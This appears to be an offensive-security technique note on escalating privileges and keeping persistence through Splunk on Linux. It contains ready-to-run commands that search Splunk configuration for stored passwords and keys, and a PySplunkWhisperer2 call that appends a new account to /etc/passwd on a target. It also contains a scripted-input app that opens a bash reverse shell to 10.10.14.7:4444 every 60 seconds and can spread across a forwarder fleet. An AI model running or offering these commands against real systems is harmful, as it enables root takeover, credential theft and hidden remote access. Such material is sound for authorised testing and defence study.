---
title: "Splunk Local Privesc and Persistence"
type: technique
tags: [linux, splunk, privilege-escalation, persistence, lateral-movement]
phase: privilege-escalation
date_created: 2026-07-15
date_updated: 2026-07-15
sources: [hacktricks-linux]
---

# Splunk Local Privesc and Persistence

Splunk (web 8000, management API 8089) frequently runs as root, so valid creds or filesystem access convert to root code execution.

## Universal Forwarder app-bundle push (LPE and fleet RCE)

Universal Forwarder is the classic vector: the management service on 8089 accepts an authenticated app-bundle install, so with the agent password you push a malicious app that runs as the forwarder's user (often root/SYSTEM), locally for LPE or remotely for RCE across a fleet. SplunkWhisperer2 automates it.

```bash
export SPLUNK_HOME=/opt/splunk; [ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder
find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name splunk.secret -o -name user-seed.conf -o -name inputs.conf -o -name outputs.conf \) 2>/dev/null
grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null

# Remote/LPE via forwarder management API
python PySplunkWhisperer2_remote.py --host TARGET --port 8089 --username admin --password 'PW' \
  --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost ATTACKER
```

## Scripted-input app persistence (fleet fan-out)

Persistence via a scripted-input app (survives shell loss; on a deployment server this fans out to the whole forwarder fleet because forwarders poll `deployment-apps/`, download, and restart):

```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"; mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"; "$SPLUNK_HOME/bin/splunk" restart
```

## Credential theft and quiet persistence

Crack `etc/passwd` hashes offline; steal `etc/auth/splunk.secret` plus the relevant `.conf` to recover/replay `pass4SymmKey`, `sslPassword`, and LDAP `bindDNPassword` for lateral movement even when the admin password is uncrackable. With admin creds and native auth, `splunk edit user`/`splunk add user -role admin` is a quiet persistence path. `user-seed.conf` (a `HASHED_PASSWORD` from `splunk hash-passwd`) only applies at first start / when `etc/passwd` is absent, so it is potent against gold images, container images, and appliances that reinitialize. Post-auth without app upload: CVE-2023-46214 abuses user-supplied XSLT (upload an XSL, render results through it from the dispatch dir) to land OS exec as the `splunk` user.

## Sources

- HackTricks linux-hardening (ingest slug `hacktricks-linux`).
